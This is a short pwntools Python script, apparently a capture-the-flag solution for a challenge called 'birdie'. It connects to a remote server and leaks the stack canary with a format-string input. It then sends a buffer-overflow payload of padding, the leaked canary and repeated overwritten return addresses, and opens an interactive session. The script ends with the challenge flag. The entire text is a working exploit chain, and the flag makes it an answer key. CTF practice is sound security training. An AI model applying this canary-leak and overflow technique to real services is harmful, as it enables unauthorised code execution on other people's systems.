from pwn import *

elf = ELF("birdie")
offset = 0x48  # 72
r = remote("34.121.211.139", 1111)

r.sendline("%15$p")
r.recvuntil("\n")
canary = int(r.recvline().strip(), 16)
log.success("canary leaked --> %s" % hex(canary))

r.recvuntil("the payload\n")
payload = b"A" * 72 + p64(canary) + p64(0x00400873) + p64(0x00400873) + p64(0x00400873) + p64(0x00400873)
r.sendline(payload)

r.interactive()

# FLAG --> shaktictf{c4tch1ng_th3_birdie_w4s_e4sy_pe4sy}
